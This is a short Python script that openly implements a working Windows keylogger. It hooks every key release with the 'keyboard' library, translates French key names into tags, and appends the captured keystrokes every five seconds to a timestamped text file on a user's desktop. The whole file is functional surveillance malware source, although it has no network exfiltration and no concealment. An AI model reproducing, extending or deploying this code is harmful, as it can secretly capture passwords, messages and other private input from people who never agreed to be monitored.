import keyboard
from datetime import datetime
from threading import Timer

keyDict = {"space":" ", "enter":"[ENTER]\n", "decimal":".", "tab":"[TAB]", "esc":"[ESC]", "ctrl":"[CTRL]", "alt":"[ALT]", "maj":"[LSHIFT]", "verr.maj":"[CAPS]",
           "right shift":"[RSHIFT]", "alt gr":"[ALT GR]", "suppr":"[DEL]", "insert":"[INS]", "origine":"[HOME]", "fin":"[END]", "pg.suiv":"[PG UP]", "pg.prec":"[PG DN]",
           "gauche":"[LEFT]", "droite":"[RIGHT]", "haut":"[UP]", "bas":"[DOWN]"}

class Keylogger:
    def __init__(self, keyDictionary, path, initialTime):
        self.keyDict = keyDictionary
        self.log = ""
        self.path = path
        self.initialTime = initialTime

    def report(self):
        timer = Timer(interval=5, function=self.updateFile)
        timer.daemon = True
        timer.start()

    def callback(self, event):
        keyName = event.name
        print(keyName)
        if len(keyName) > 1:                                                    # Not a character
            if keyName in self.keyDict:
                convertedKeyName = self.keyDict[keyName]
            else:
                convertedKeyName = "_"
        else:
            convertedKeyName = str(keyName)
        
        self.log += convertedKeyName
    
    def updateFile(self):
        textFile = open(self.path + str(self.initialTime) + ".txt", "a")
        textFile.write(self.log)
        textFile.close()
        self.log = ""
        self.report()

    def start(self):
        self.initialTime = str(self.initialTime)[:-7]
        self.initialTime = self.initialTime.replace(':', '.', 2)
        if self.path[-1] != "\\":
            self.path += "\\"
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

Keylogger(keyDict, "C:\\Users\\Sam\\Desktop\\", datetime.now()).start()